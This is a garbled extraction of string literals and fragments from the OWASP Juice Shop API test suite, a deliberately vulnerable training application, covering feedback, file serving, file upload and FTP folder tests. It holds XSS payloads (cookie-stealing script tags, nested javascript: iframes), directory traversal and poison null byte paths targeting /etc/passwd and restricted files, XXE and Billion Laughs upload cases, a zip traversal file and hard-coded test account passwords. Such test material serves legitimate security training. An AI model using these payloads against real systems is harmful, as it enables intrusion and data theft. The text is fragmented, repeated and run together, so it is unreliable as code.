Starfleet symbolexpect( ... author)parsedD ... .authorexpect( ... oBe(20)expect( ... ductId)parsedD ... oductIdexpect( ... sCount)parsedD ... esCountexpect( ... dBy[0])parsedD ... edBy[0]parsedD ... likedByexpect( ... ator.')parsedD ... iews[1]Fresh out of a replicatorexpect( ... oBe(22)Export data including memories without use of CAPTCHAconst f ... e.jpg')file =  ... e.jpg')path.re ... e.jpg')'../fil ... ge.jpg'../files/validProfileImage.jpg/files/validProfileImageconst f ... mData()form =  ... mData()frisby.formData()frisby.formDataform.ap ... Image')form.appendfs.crea ... m(file)Valid ImageREST_UR ... mories'/memories'Conten ... -type']form.ge ... -type']form.getHeaders()form.getHeadersbody: formexpect( ... Image')expect( ... aption)parsedD ... captionparsedD ... ries[0]parsedData.memoriesexpect( ... image')expect( ... ageUrl)parsedD ... mageUrl'assets ... -image'assets/public/images/uploads/valid-imageExport data including orders with use of CAPTCHAExport data including reviews with use of CAPTCHAExport data including memories with use of CAPTCHAP:/My Drive/Git/juice-shop/test/api/deliveryApiSpec.ts'for regular customer''GET delivery methods''/Deliverys''for deluxe customer''ciso@''mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb''GET delivery method''/Deliverys/2'{\r\n  de ...   })\r\n}'for re ... stomer'for regular customerbeforeA ... \n    })'GET de ... ethods'GET delivery methodsAPI_URL ... iverys'/Deliverysjson.data.lengthjson.data[0].idjson.data[0]expect( ... ivery')json.data[0].nameexpect( ... e(0.99)json.data[0].pricejson.data[0].eta'for de ... stomer'for deluxe customer'ciso@' ... omain')ciso@passwor ... c!YbJb'mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI854jbNikY5fymx7c!YbJbexpect( ... Be(0.5)'GET de ... method'GET delivery methodAPI_URL ... erys/2'/Deliverys/2expect(json.data.id)expect( ... a.name)expect( ... ta.eta)json.data.etaP:/My Drive/Git/juice-shop/test/api/deluxeApiSpec.ts'GET deluxe membership status for customers''bender@''GET deluxe membership status for deluxe members throws error''GET deluxe membership status for admin throws error''GET deluxe membership status for accountant throws error''accountant@''i am an awesome accountant''POST upgrade deluxe membership status for customers'`bender@${'/Cards''POST deluxe membership status with wrong card id throws error''POST deluxe membership status for deluxe members throws error''POST deluxe membership status for admin throws error''POST deluxe membership status for accountant throws error''GET de ... tomers'GET deluxe membership status for customers'bender ... omain')bender@passwor ... iquor!'return  ... : 49 })frisby. ... : 49 })REST_UR ... ership''GET de ...  error'GET deluxe membership status for deluxe members throws errorreturn  ... mber!')frisby. ... mber!')GET deluxe membership status for admin throws errorpassword: 'admin123'return  ... ship!')frisby. ... ship!')GET deluxe membership status for accountant throws error'accoun ... omain')accountant@passwor ... untant''POST u ... tomers'POST upgrade deluxe membership status for customers`bender ... ain')}`API_URL + '/Cards'/Cardsfrisby. ... ccess')paymentMode: 'card'json.da ... tring()json.da ... oString'POST d ...  error'POST deluxe membership status with wrong card id throws errorfrisby. ...  Card')paymentId: 1337POST deluxe membership status for deluxe members throws errorreturn  ... gain!')frisby. ... gain!')POST deluxe membership status for admin throws errorPOST deluxe membership status for accountant throws errorP:/My Drive/Git/juice-shop/test/api/erasureRequestApiSpec.tsBASE_URL'GET erasure form for logged-in users includes their email and security question''bjoern@owasp.org''kitten lesser pooch karate buffoon indoors''/dataerasure/'Cookie'token=''Name of your favorite pet?''GET erasure form rendering fails for users without assigned security answer''Error: No answer found!''GET erasure form rendering fails on unauthenticated access''Error: Blocked illegal activity''POST erasure request does not actually delete the user''text/html; charset=utf-8''POST erasure form  fails on unauthenticated access''POST erasure request with empty layout parameter returns''POST erasure request with non-existing file path as layout parameter throws error''../this/file/does/not/exist''no such file or directory''POST erasure request with existing file path as layout parameter returns content truncated''juice-shop'const B ... t:3000'BASE_UR ... t:3000''GET er ... estion'GET erasure form for logged-in users includes their email and security questionemail:  ... sp.org'bjoern@owasporgpasswor ... ndoors'return  ...  pet?')frisby. ...  pet?')frisby. ... p.org')BASE_UR ... asure/'/dataerasure/{ Cooki ... token }Cookie: ... n.token'token= ... n.tokentoken=Name of your favorite pe'GET er ... answer'GET erasure form rendering fails for users without assigned security answerreturn  ... ound!')frisby. ... ound!')'Error: ... found!'Error: No answer found!'GET er ... access'GET erasure form rendering fails on unauthenticated accessreturn  ... ivity')frisby. ... ivity')frisby. ... sure/')'Error: ... tivity'Error: Blocked illegal activity'POST e ... e user'POST erasure request does not actually delete the userform.ap ... l.com')frisby. ... utf-8')'text/h ... =utf-8'text/html; charset=utf-8'POST e ... access'POST erasure form  fails on unauthenticated access'POST e ... eturns'POST erasure request with empty layout parameter returnslayout: nullPOST erasure request with non-existing file path as layout parameter throws errorreturn  ... ctory')frisby. ... ctory')layout: ... /exist''../thi ... /exist'../this/file/does/not/exist/this/file/does/not/exist'no suc ... ectory'no such file or directory'POST e ... ncated'POST erasure request with existing file path as layout parameter returns content truncatedreturn  ... .....')frisby. ... .....')frisby. ... -shop')layout: ... e.json'P:/My Drive/Git/juice-shop/test/api/feedbackApiSpec.ts'GET all feedback''/Feedbacks''POST sanitizes unsafe HTML from comment''/captcha''I am a harm<script>steal-cookie</script><img src="csrf-attack"/><iframe src="evil-content"></iframe>less comment.''I am a harmless comment.''POST fails to sanitize masked XSS-attack by not applying sanitization recursively''The sanitize-html module up to at least version 1.4.2 has this issue: <<script>Foo</script>iframe src="javascript:alert(`xss`)">''The sanitize-html module up to at least version 1.4.2 has this issue: <iframe src="javascript:alert(`xss`)">''POST feedback in another users name as anonymous user''Lousy crap! You use sequelize 1.7.x? Welcome to SQL Injection-land, morons! As if that is not bad enough, you use z85/base85 and hashids for crypto? Even MD5 to hash passwords! Srsly?!?!''POST feedback in a non-existing users name as anonymous user fails with constraint error''Pickle Rick says your express-jwt 0.1.3 has Eurogium Edule and Hueteroneel in it!''SQLITE_CONSTRAINT: FOREIGN KEY constraint failed''POST feedback is associated with current user''Stupid JWT secret "'defaultSecret'" and being typosquatted by epilogue-js and anuglar2-qrcode!''POST feedback is associated with any passed user ID''Bender\'s choice award!''POST feedback can be created without actually supplying comment''POST feedback cannot be created without actually supplying rating'/notNull Violation: (Feedback\.)?rating cannot be null/'POST feedback cannot be created with wrong CAPTCHA answer''POST feedback cannot be created with invalid CAPTCHA id'999999'GET existing feedback by id is forbidden via public API''/Feedbacks/1''GET existing feedback by id''PUT update existing feedback is forbidden via public API''This sucks like nothing has ever sucked before''PUT update existing feedback''/Feedbacks/2''DELETE existing feedback is forbidden via public API''DELETE existing feedback''I will be gone soon!''/Feedbacks/'const a ... json/ }authHea ... json/ }{ Autho ... json/ }'conten ... \/json/GET all feedbackfrisby. ... backs')API_URL ... dbacks'/Feedbacks'POST s ... omment'POST sanitizes unsafe HTML from commentfrisby. ... ptcha')comment ... mment.''I am a ... mment.'I am a harm<script>steal-cookie</script><img src="csrf-attack"/><iframe src="evil-content"></iframe>less comment.I am a harm<script>steal-cookie</script><img src="csrf-attack"/><iframe src="evil-content"></iframe>less commentrating: 1json.captchaIdcaptcha: json.answerjson.answerI am a harmless comment.I am a harmless comment'POST f ... sively'POST fails to sanitize masked XSS-attack by not applying sanitization recursivelycomment ... ss`)">''The sa ... ss`)">'The sanitize-html module up to at least version 1.4.2 has this issue: <<script>Foo</script>iframe src="javascript:alert(`xss`)">The sanitize-html module up to at least version 12 has this issue: <<script>Foo</script>iframe src="javascript:alertThe sanitize-html module up to at least version 1.4.2 has this issue: <iframe src="javascript:alert(`xss`)">2 has this issue: <iframe src="javascript:alert'POST f ... s user'POST feedback in another users name as anonymous usercomment ... ly?!?!''Lousy  ... ly?!?!'Lousy crap! You use sequelize 1.7.x? Welcome to SQL Injection-land, morons! As if that is not bad enough, you use z85/base85 and hashids for crypto? Even MD5 to hash passwords! Srsly?!?!Lousy crap! You use sequelize 1 Welcome to SQL Injection-land, morons! As if that is not bad enough, you use z85/base85 and hashids for crypt Even MD5 to hash passwords! Srsly?!?'POST f ...  error'POST feedback in a non-existing users name as anonymous user fails with constraint errorcomment ... in it!''Pickle ... in it!'Pickle Rick says your express-jwt 0.1.3 has Eurogium Edule and Hueteroneel in it!Pickle Rick says your express-jwt 03 has Eurogium Edule and Hueteroneel in it!rating: 0UserId: 4711expect(json.errors)json.errors'SQLITE ... failed'SQLITE_CONSTRAINT: FOREIGN KEY constraint failed'POST f ... t user'POST feedback is associated with current usercomment ... rcode!''Stupid ... rcode!''Stupid ... tSecret'Stupid ... cret "'Stupid JWT secret "securit ... tSecret'" and  ... rcode!'" and being typosquatted by epilogue-js and anuglar2-qrcode!'POST f ... ser ID'POST feedback is associated with any passed user IDcomment ... award!''Bender ... award!'Bender's choice award!'POST f ... omment'POST feedback can be created without actually supplying commentcomment: null'POST f ... rating'POST feedback cannot be created without actually supplying ratingmessage ... tring()expect( ... null/))json.me ...  null/)json.message.matchjson.message/notNul ... e null/notNull Violation: (Feedback\.)?rating cannot be nullnotNull Violation: (Feedback\.)?(Feedback\.)Feedback\.rating cannot be null'POST f ... answer'POST feedback cannot be created with wrong CAPTCHA answercaptcha ... er + 1)(json.answer + 1)json.answer + 1'POST f ... CHA id'POST feedback cannot be created with invalid CAPTCHA idcaptchaId: 999999captcha: 42GET existing feedback by id is forbidden via public APIfrisby. ... cks/1')API_URL ... acks/1'/Feedbacks/1GET existing feedback by idPUT update existing feedback is forbidden via public APIcomment ... before''This s ... before'This sucks like nothing has ever sucked before'PUT up ... edback'PUT update existing feedbackAPI_URL ... acks/2'/Feedbacks/2DELETE existing feedback is forbidden via public API'DELETE ... edback'DELETE existing feedbackfrisby. ...       )frisby. ... er() })comment ...  soon!''I will ...  soon!'I will be gone soon!{ id: Joi.number() }API_URL ... backs/'/Feedbacks/P:/My Drive/Git/juice-shop/test/api/fileServingSpec.ts'../../lib/config.types''Server''GET responds with index.html when visiting application URL'/text\/html/'main.js''runtime.js''polyfills.js''GET responds with index.html when visiting application URL with any path''/whatever''GET a restricted file directly from file system path on server via Directory Traversal attack loads index.html instead''/public/images/../../ftp/eastere.gg''<meta name="description" content="Probably the most modern and sophisticated insecure web application">''GET a restricted file directly from file system path on server via URL-encoded Directory Traversal attack loads index.html instead''/public/images/%2e%2e%2f%2e%2e%2fftp/eastere.gg''GET serves a security.txt file''GET serves a security.txt file under well-known subfolder''GET serves a robots.txt file''/robots.txt''GET serves a csaf provider-metadata.json''/.well-known/csaf/provider-metadata.json''GET serves a csaf index.txt''/.well-known/csaf/index.txt''GET serves a csaf changes.csv''/.well-known/csaf/changes.csv''GET serves a csaf juice-shop-sa-20200513-express-jwt.json''/.well-known/csaf/2017/juice-shop-sa-20200513-express-jwt.json''juice-shop-sa-20200513-express-jwt''We will soon release a patch''/public/images/padding''GET tracking image for "Score Board" page access challenge''/assets/public/images/padding/1px.png''GET tracking image for "Administration" page access challenge''/assets/public/images/padding/19px.png''GET tracking image for "Token Sale" page access challenge''/assets/public/images/padding/56px.png''GET tracking image for "Privacy Policy" page access challenge''/assets/public/images/padding/81px.png''GET serves a directory listing''<title>listing directory /encryptionkeys</title>''GET a non-existing file in will return a 404 error''/encryptionkeys/doesnotexist.md''GET the Premium Content AES key''/encryptionkeys/premium.key''GET a key file whose name contains a "/" fails with a 403 error''/encryptionkeys/%2fetc%2fos-release%2500.md'urlEncode'Error: File names cannot contain forward slashes!''Hidden URL''GET the second easter egg by visiting the Base64>ROT13-decrypted URL''<title>Welcome to Planet Orangeuze</title>''GET the premium content by visiting the AES decrypted URL''GET the missing "Thank you!" image for assembling the URL hidden in the Privacy Policy''GET Klingon translation file for "Extra Language" challenge''/assets/i18n/tlh_AA.json''GET blueprint file for "Retrieve Blueprint" challenge''/assets/public/images/products/''GET crazy cat photo for "Missing Encoding" challenge''/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg''GET folder containing access log files for "Access Log" challenge''/support/logs/access.log.'/application\/octet-stream/'GET path traversal does not work in folder containing access log files''/support/logs/../../../../etc/passwd''../../ ... .types'../../lib/config.typesblueprint: stringfor (co ... \n  }\r\n}if (pro ... ak\r\n  }{\r\n     ... ak\r\n  }'GET re ... on URL'GET responds with index.html when visiting application URLGET responds with indexhtml when visiting application URLreturn  ... ls.js')frisby. ... ls.js')frisby. ... me.js')frisby. ... /html/)frisby.get(URL)text\/htmlmain.jsruntime.jspolyfills.jspolyfills'GET re ... y path'GET responds with index.html when visiting application URL with any pathhtml when visiting application URL with any pathfrisby. ... tever')URL + '/whatever'/whateverxit('GE ... )\r\n  })'GET a  ... nstead'GET a restricted file directly from file system path on server via Directory Traversal attack loads index.html insteadGET a restricted file directly from file system path on server via Directory Traversal attack loads indexhtml insteadreturn  ... ion">')frisby. ... ion">')frisby. ... re.gg')URL + ' ... ere.gg''/publi ... ere.gg'/public/images/../../ftp/eastere.gg'<meta  ... tion">'<meta name="description" content="Probably the most modern and sophisticated insecure web application">GET a restricted file directly from file system path on server via URL-encoded Directory Traversal attack loads index.html insteadGET a restricted file directly from file system path on server via URL-encoded Directory Traversal attack loads index/public/images/%2e%2e%2f%2e%2e%2fftp/eastere.gg'GET se ... t file'GET serves a security.txt fileGET serves a securitytxt filefrisby. ... y.txt')URL + ' ... ty.txt''GET se ... folder'GET serves a security.txt file under well-known subfoldertxt file under well-known subfolderGET serves a robots.txt fileGET serves a robotsfrisby. ... s.txt')URL + '/robots.txt'/robots.txt'GET se ... a.json'GET serves a csaf provider-metadata.jsonGET serves a csaf provider-metadatafrisby. ... .json')URL + ' ... a.json''GET se ... ex.txt'GET serves a csaf index.txtGET serves a csaf indexfrisby. ... x.txt')URL + ' ... ex.txt''/.well ... ex.txt'/.well-known/csaf/index.txt'GET se ... es.csv'GET serves a csaf changes.csvGET serves a csaf changescsvfrisby. ... s.csv')URL + ' ... es.csv''/.well ... es.csv'/.well-known/csaf/changes.csv'GET se ... t.json'GET serves a csaf juice-shop-sa-20200513-express-jwt.jsonGET serves a csaf juice-shop-sa-20200513-express-jwtreturn  ... patch')frisby. ... patch')frisby. ... s-jwt')URL + ' ... t.json''/.well ... t.json'/.well-known/csaf/2017/juice-shop-sa-20200513-express-jwt.json'juice- ... ss-jwt'juice-shop-sa-20200513-express-jwt'We wil ...  patch'We will soon release a patch'/publi ... adding'/public/images/padding'GET tr ... llenge'GET tracking image for "Score Board" page access challengereturn  ... e/png')frisby. ... e/png')frisby. ... x.png')URL + ' ... px.png''/asset ... px.png'/assets/public/images/padding/1px.pngGET tracking image for "Administration" page access challenge/assets/public/images/padding/19px.pngGET tracking image for "Token Sale" page access challenge/assets/public/images/padding/56px.pngGET tracking image for "Privacy Policy" page access challenge/assets/public/images/padding/81px.png'GET se ... isting'GET serves a directory listingreturn  ... itle>')frisby. ... itle>')frisby. ... nkeys')URL + ' ... onkeys'<title>listing directory /encryptionkeys</title>'GET a  ...  error'GET a non-existing file in will return a 404 errorfrisby. ... st.md')URL + ' ... ist.md''/encry ... ist.md'/encryptionkeys/doesnotexist.md'GET th ... ES key'GET the Premium Content AES keyfrisby. ... m.key')URL + ' ... um.key''/encry ... um.key'/encryptionkeys/premium.keyGET a key file whose name contains a "/" fails with a 403 errorreturn  ... shes!')frisby. ... shes!')frisby. ... ', 403)frisby. ... alse })frisby.fetchURL + ' ... 500.md''/encry ... 500.md'/encryptionkeys/%2fetc%2fos-release%2500.md{ urlEncode: false }urlEncode: false'Error: ... ashes!'Error: File names cannot contain forward slashes!Hidden URL'GET th ... ed URL'GET the second easter egg by visiting the Base64>ROT13-decrypted URLfrisby. ... r/egg')URL + ' ... er/egg'<title>Welcome to Planet Orangeuze</title>GET the premium content by visiting the AES decrypted URLreturn  ... /jpeg')frisby. ... /jpeg')frisby. ... to/us')URL + ' ... /to/us''GET th ... Policy'GET the missing "Thank you!" image for assembling the URL hidden in the Privacy Policyfrisby. ... ility')URL + ' ... bility''GET Kl ... llenge'GET Klingon translation file for "Extra Language" challengereturn  ... /json/)URL + ' ... A.json''/asset ... A.json'/assets/i18n/tlh_AA.json'GET bl ... llenge'GET blueprint file for "Retrieve Blueprint" challengefrisby. ... eprint)URL + ' ... ueprintURL + ' ... ducts/''/asset ... ducts/'/assets/public/images/products/'GET cr ... llenge'GET crazy cat photo for "Missing Encoding" challengefrisby. ... 7.jpg')URL + ' ... 77.jpg''/asset ... 77.jpg'/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg'GET fo ... llenge'GET folder containing access log files for "Access Log" challengereturn  ... tream/)frisby. ... tream/)frisby. ... ate()))URL + ' ... Date())URL + ' ... s.log.''/suppo ... s.log.'/support/logs/access.log./applic ... stream/application\/octet-streamoctet-stream'GET pa ...  files'GET path traversal does not work in folder containing access log files() => { ... 3)\r\n  }return  ... ', 403)frisby. ... asswd')URL + ' ... passwd''/suppo ... passwd'/support/logs/../../../../etc/passwdP:/My Drive/Git/juice-shop/test/api/fileUploadSpec.ts usually runs into 410 on Travis-CI but into 503 locally// usua ... locally'POST file valid PDF for client and API''../files/validSizeAndTypeForClient.pdf''POST file too large for client validation but valid for API''../files/invalidSizeForClient.pdf''POST file with illegal type for client validation but valid for API''../files/invalidTypeForClient.exe''POST file type XML deprecated for API''../files/deprecatedTypeForServer.xml''POST large XML file near upload size limit''../files/maxSizeForServer.xml''POST file type XML with XXE attack against Windows''../files/xxeForWindows.xml''POST file type XML with XXE attack against Linux''../files/xxeForLinux.xml''POST file type XML with Billion Laughs attack is caught by parser''../files/xxeBillionLaughs.xml''Detected an entity reference loop''POST file type XML with Quadratic Blowup attack''../files/xxeQuadraticBlowup.xml'toBeGreaterThanOrEqual'POST file type XML with dev/random attack''../files/xxeDevRandom.xml''POST file too large for API''../files/invalidSizeForServer.pdf''POST zip file with directory traversal payload''../files/arbitraryFileWrite.zip''POST zip file with password protection''../files/passwordProtected.zip''POST f ... nd API'POST file valid PDF for client and APIconst f ... t.pdf')file =  ... t.pdf')path.re ... t.pdf')'../fil ... nt.pdf'../files/validSizeAndTypeForClient.pdf/files/validSizeAndTypeForClientform.ap ... (file))return  ... ', 204)frisby. ... ', 204)frisby. ... form })URL + '/file-upload'{ heade ...  form }headers ... ype'] }{ 'Cont ... ype'] }'POST f ... or API'POST file too large for client validation but valid for API../files/invalidSizeForClient.pdf/files/invalidSizeForClientPOST file with illegal type for client validation but valid for APIconst f ... t.exe')file =  ... t.exe')path.re ... t.exe')'../fil ... nt.exe'../files/invalidTypeForClient.exe/files/invalidTypeForClientexePOST file type XML deprecated for APIconst f ... r.xml')file =  ... r.xml')path.re ... r.xml')'../fil ... er.xml'../files/deprecatedTypeForServer.xml/files/deprecatedTypeForServerreturn  ... ', 410)frisby. ... ', 410)'POST l ...  limit'POST large XML file near upload size limit../files/maxSizeForServer.xml/files/maxSizeForServer'POST f ... indows'POST file type XML with XXE attack against Windowsconst f ... s.xml')file =  ... s.xml')path.re ... s.xml')'../fil ... ws.xml'../files/xxeForWindows.xml/files/xxeForWindows'POST f ...  Linux'POST file type XML with XXE attack against Linuxconst f ... x.xml')file =  ... x.xml')path.re ... x.xml')'../fil ... ux.xml'../files/xxeForLinux.xml/files/xxeForLinux'POST f ... parser'POST file type XML with Billion Laughs attack is caught by parser'../fil ... hs.xml'../files/xxeBillionLaughs.xml/files/xxeBillionLaughsreturn  ...  loop')frisby. ...  loop')'POST f ... attack'POST file type XML with Quadratic Blowup attackconst f ... p.xml')file =  ... p.xml')path.re ... p.xml')'../fil ... up.xml'../files/xxeQuadraticBlowup.xml/files/xxeQuadraticBlowupfrisby. ... }).thenexpect( ... al(410)expect( ... OrEqualtoBeGre ... OrEqualPOST file type XML with dev/random attackconst f ... m.xml')file =  ... m.xml')path.re ... m.xml')'../fil ... om.xml'../files/xxeDevRandom.xml/files/xxeDevRandomPOST file too large for APIconst f ... r.pdf')file =  ... r.pdf')path.re ... r.pdf')'../fil ... er.pdf'../files/invalidSizeForServer.pdf/files/invalidSizeForServer'POST z ... ayload'POST zip file with directory traversal payloadconst f ... e.zip')file =  ... e.zip')path.re ... e.zip')'../fil ... te.zip'../files/arbitraryFileWrite.zip/files/arbitraryFileWrite'POST z ... ection'POST zip file with password protectionconst f ... d.zip')file =  ... d.zip')path.re ... d.zip')'../fil ... ed.zip'../files/passwordProtected.zip/files/passwordProtectedP:/My Drive/Git/juice-shop/test/api/ftpFolderSpec.ts'<title>listing directory /ftp</title>''GET a non-existing Markdown file in /ftp will return a 404 error''/ftp/doesnotexist.md''GET a non-existing PDF file in /ftp will return a 404 error''/ftp/doesnotexist.pdf''GET a non-existing file in /ftp will return a 403 error for invalid file type''/ftp/doesnotexist.exe''GET an existing file in /ftp will return a 403 error for invalid file type .gg''GET existing file /ftp/coupons_2013.md.bak will return a 403 error for invalid file type .bak''GET existing file /ftp/package.json.bak will return a 403 error for invalid file type .bak''GET existing file /ftp/suspicious_errors.yml will return a 403 error for invalid file type .yml''GET the confidential file in /ftp''/ftp/acquisitions.md''# Planned Acquisitions''GET the KeePass database in /ftp''GET the easter egg file by using Poison Null Byte attack with .pdf suffix''/ftp/eastere.gg%00.pdf''Congratulations, you found the easter egg!''GET the easter egg file by using Poison Null Byte attack with .md suffix''/ftp/eastere.gg%00.md''GET the SIEM signature file by using Poison Null Byte attack with .pdf suffix''/ftp/suspicious_errors.yml%00.pdf''Suspicious error messages specific to the application''GET the SIEM signature file by using Poison Null Byte attack with .md suffix''/ftp/suspicious_errors.yml%00.md''GET the 2013 coupon code file by using Poison Null Byte attack with .pdf suffix''/ftp/coupons_2013.md.bak%00.pdf''n<MibgC7sn''GET the 2013 coupon code file by using an Poison Null Byte attack with .md suffix''/ftp/coupons_2013.md.bak%00.md''GET the package.json.bak file by using Poison Null Byte attack with .pdf suffix''/ftp/package.json.bak%00.pdf''"name": "juice-shop",''GET the package.json.bak file by using Poison Null Byte attack with .md suffix''/ftp/package.json.bak%00.md''GET a restricted file directly from file system path on server by tricking route definitions fails with 403 error''/ftp///eastere.gg''GET a restricted file directly from file system path on server by appending URL parameter fails with 403 error''/ftp/eastere.gg?.md''GET a file whose name contains a "/" fails with a 403 error''/ftp/%2fetc%2fos-release%2500.md''GET an accessible file directly from file system path on server''/ftp/legal.md''# Legal Information''GET a non-existing file via direct server file path /ftp will return a 404 error''GET the package.json.bak file contains a dependency on epilogue-js for "Typosquatting" challenge''"epilogue-js": "~0.7",''GET file /ftp/quarantine/juicy_malware_linux_amd_64.url''/ftp/quarantine/juicy_malware_linux_amd_64.url''GET file /ftp/quarantine/juicy_malware_linux_arm_64.url''/ftp/quarantine/juicy_malware_linux_arm_64.url''GET existing file /ftp/quarantine/juicy_malware_macos_64.url''/ftp/quarantine/juicy_malware_macos_64.url''GET existing file /ftp/quarantine/juicy_malware_windows_64.exe.url''/ftp/quarantine/juicy_malware_windows_64.exe.url'frisby. ... '/ftp')URL + '/ftp'<title>listing directory /ftp</title>GET a non-existing Markdown file in /ftp will return a 404 error'/ftp/d ... ist.md'/ftp/doesnotexist.mdGET a non-existing PDF file in /ftp will return a 404 errorfrisby. ... t.pdf')URL + ' ... st.pdf''/ftp/d ... st.pdf'/ftp/doesnotexist.pdf'GET a  ... e type'GET a non-existing file in /ftp will return a 403 error for invalid file typefrisby. ... t.exe')URL + ' ... st.exe''/ftp/d ... st.exe'/ftp/doesnotexist.exe'GET an ... pe .gg'GET an existing file in /ftp will return a 403 error for invalid file type .ggGET an existing file in /ftp will return a 403 error for invalid file type 'GET ex ... e .bak'GET existing file /ftp/coupons_2013.md.bak will return a 403 error for invalid file type .bakGET existing file /ftp/coupons_2013bak will return a 403 error for invalid file type frisby. ... d.bak')URL + ' ... md.bak'GET existing file /ftp/package.json.bak will return a 403 error for invalid file type .bakGET existing file /ftp/packagefrisby. ... n.bak')URL + ' ... on.bak''GET ex ... e .yml'GET existing file /ftp/suspicious_errors.yml will return a 403 error for invalid file type .ymlGET existing file /ftp/suspicious_errorsyml will return a 403 error for invalid file type frisby. ... s.yml')URL + ' ... rs.yml''GET th ... n /ftp'GET the confidential file in /ftpfrisby. ... ns.md')URL + ' ... ons.md''/ftp/a ... ons.md'/ftp/acquisitions.md'# Plan ... itions'# Planned AcquisitionsGET the KeePass database in /ftpfrisby. ... .kdbx')URL + ' ... t.kdbx''GET th ... suffix'GET the easter egg file by using Poison Null Byte attack with .pdf suffixGET the easter egg file by using Poison Null Byte attack with pdf suffixreturn  ...  egg!')frisby. ...  egg!')frisby. ... 0.pdf')URL + ' ... 00.pdf''/ftp/e ... 00.pdf'/ftp/eastere.gg%00.pdf'Congra ... r egg!'Congratulations, you found the easter egg!GET the easter egg file by using Poison Null Byte attack with .md suffixmd suffixfrisby. ... 00.md')URL + ' ... %00.md''/ftp/e ... %00.md'/ftp/eastere.gg%00.mdGET the SIEM signature file by using Poison Null Byte attack with .pdf suffixGET the SIEM signature file by using Poison Null Byte attack with return  ... ation')'/ftp/s ... 00.pdf'/ftp/suspicious_errors.yml%00.pdf'Suspic ... cation'GET the SIEM signature file by using Poison Null Byte attack with .md suffix'/ftp/s ... %00.md'/ftp/suspicious_errors.yml%00.mdGET the 2013 coupon code file by using Poison Null Byte attack with .pdf suffixGET the 2013 coupon code file by using Poison Null Byte attack with return  ... gC7sn')frisby. ... gC7sn')'/ftp/c ... 00.pdf'/ftp/coupons_2013.md.bak%00.pdfn<MibgC7snGET the 2013 coupon code file by using an Poison Null Byte attack with .md suffixGET the 2013 coupon code file by using an Poison Null Byte attack with '/ftp/c ... %00.md'/ftp/coupons_2013.md.bak%00.mdGET the package.json.bak file by using Poison Null Byte attack with .pdf suffixGET the packagebak file by using Poison Null Byte attack with return  ... hop",')frisby. ... hop",')'/ftp/p ... 00.pdf'/ftp/package.json.bak%00.pdf'"name" ... shop",'"name": "juice-shop",GET the package.json.bak file by using Poison Null Byte attack with .md suffix'/ftp/p ... %00.md'/ftp/package.json.bak%00.mdGET a restricted file directly from file system path on server by tricking route definitions fails with 403 error/ftp///eastere.ggGET a restricted file directly from file system path on server by appending URL parameter fails with 403 errorfrisby. ... g?.md')URL + ' ... gg?.md''/ftp/e ... gg?.md'/ftp/eastere.gg?.mdGET a file whose name contains a "/" fails with a 403 error'/ftp/% ... 500.md'/ftp/%2fetc%2fos-release%2500.md'GET an ... server'GET an accessible file directly from file system path on serverfrisby. ... al.md')URL + ' ... gal.md'/ftp/legal.md'# Lega ... mation'# Legal InformationGET a non-existing file via direct server file path /ftp will return a 404 error'GET th ... llenge'GET the package.json.bak file contains a dependency on epilogue-js for "Typosquatting" challengebak file contains a dependency on epilogue-js for "Typosquatting" challengereturn  ... 0.7",')frisby. ... 0.7",')'"epilo ... ~0.7",'"epilogue-js": "~0.7","epilogue-js": "~07",'GET fi ... 64.url'GET file /ftp/quarantine/juicy_malware_linux_amd_64.urlGET file /ftp/quarantine/juicy_malware_linux_amd_64frisby. ... 4.url')URL + ' ... 64.url''/ftp/q ... 64.url'/ftp/quarantine/juicy_malware_linux_amd_64.urlGET file /ftp/quarantine/juicy_malware_linux_arm_64.urlGET file /ftp/quarantine/juicy_malware_linux_arm_64/ftp/quarantine/juicy_malware_linux_arm_64.url'GET ex ... 64.url'GET existing file /ftp/quarantine/juicy_malware_macos_64.urlGET existing file /ftp/quarantine/juicy_malware_macos_64/ftp/quarantine/juicy_malware_macos_64.url'GET ex ... xe.url'GET existing file /ftp/quarantine/juicy_malware_windows_64.exe.urlGET existing file /ftp/quarantine/juicy_malware_windows_64frisby. ... e.url')URL + ' ... xe.url''/ftp/q ... xe.url'/ftp/quarantine/juicy_malware_windows_64.exe.urlP:/My Drive/Git/juice-shop/test/api/httpSpec.ts'HTTP''response must contain CORS header allowing all origins''Access-Control-Allow-Origin''\\*''response must contain sameorigin frameguard header''X-Frame-Options''SAMEORIGIN''X-Content-Type-Options''nosniff''response must not contain recruiting header''response must not contain XSS protection header'expectNot'X-XSS-Protection'HTTP'respon ... rigins'response must contain CORS header allowing all originsreturn  ...  '\\*')frisby. ...  '\\*')'Access ... Origin'Access-Control-Allow-Origin\*'respon ... header'response must contain sameorigin frameguard headerreturn  ... RIGIN')frisby. ... RIGIN')X-Frame-OptionsSAMEORIGINreturn  ... sniff')frisby. ... sniff')'X-Cont ... ptions'X-Content-Type-Optionsnosniffresponse must not contain recruiting headerreturn  ... ring'))frisby. ... ring'))response must not contain XSS protection headerreturn  ... ction')frisby. ... ction')frisby. ... pectNotX-XSS-ProtectionP:/My Drive/Git/juice-shop/test/api/internetResourcesSpec.ts FIXME Tests fail regularly (but not always) from ECONNRESET// FIXM ... NNRESET FIXME Test would need to confirm/bypass PasteBin SMART filter to retrieve content// FIXM ... content'Required Internet resource''PasteBin paste for "Leaked Unsafe Product" challenge available''for default configuration (https://pastebin.com/90dUgd7s)''https://pastebin.com/90dUgd7s''Hueteroneel''this coupled with Eurogium Edule was sometimes found fatal''for 7MS configuration (https://pastebin.com/8SMbWPxc)''https://pastebin.com/8SMbWPxc''TAYLOR SWIFT''KATY PERRY''(Consider rivalries when picking song list for events as wrong combo could infuriate a mixed-fans audience, see https://www.nickiswift.com/2075/taylor-swifts-list-enemies)''for BodgeIt Store configuration (https://pastebin.com/G47LrDr0)''https://pastebin.com/G47LrDr0''Mind Blank - one willing creature you touch is immune any effect''They should seek out a Couatl, and undertake a quest to receive''They could acquire the aid of a rakshasa, and willingly invoke its''Note to self: Option (1) and (3) of the above should not be combined.''for Mozilla configuration (https://pastebin.com/t8jqE1y7)''https://pastebin.com/t8jqE1y7''Fixed a bug that, when this plugin was installed together with both the''JuiceNote''Magische Firefox Suche''plugins, lwt your browser throw a''JuiceOverFlowError''The problem can still occur post-fix but at least now less frequently!''for All Day DevOps configuration 